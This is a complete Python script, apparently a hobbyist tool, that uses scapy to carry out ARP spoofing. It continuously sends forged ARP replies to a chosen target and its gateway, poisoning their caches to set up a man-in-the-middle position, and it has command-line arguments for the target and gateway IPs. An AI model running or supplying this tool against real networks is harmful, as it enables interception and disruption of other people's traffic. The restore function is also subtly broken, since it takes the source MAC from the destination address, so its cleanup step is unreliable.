#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import argparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose = False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count = 4, verbose = False)

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t' , '--target' , dest = 'target', help = 'Target IP Address')
    parser.add_argument('-g' , '--gateway' , dest = 'gateway', help = 'Gateway IP Address')
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Enter Target IP Address. Use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Enter Gateway IP Address. Use --help for more info.")
    return options

options = get_args()
target_ip = options.target
gateway_ip = options.gateway


try :
 sent_packages_count = 0
 while True:
    spoof(target_ip , gateway_ip)
    spoof(gateway_ip , target_ip)
    sent_packages_count = sent_packages_count + 2
    print("\r [+] Packets sent : " + str(sent_packages_count)) ,\
    # print("\r [-] Packets sent : " + str(sent_packages_count) , end = "") and remove sys module for py3.
    sys.stdout.flush()
    time.sleep(2)
except KeyboardInterrupt :
    print("\n [-] Detected CTRL + C ...... Resetting ARP Tables ...... Please wait. \n")
    restore(target_ip , gateway_ip)
    restore(gateway_ip , target_ip)
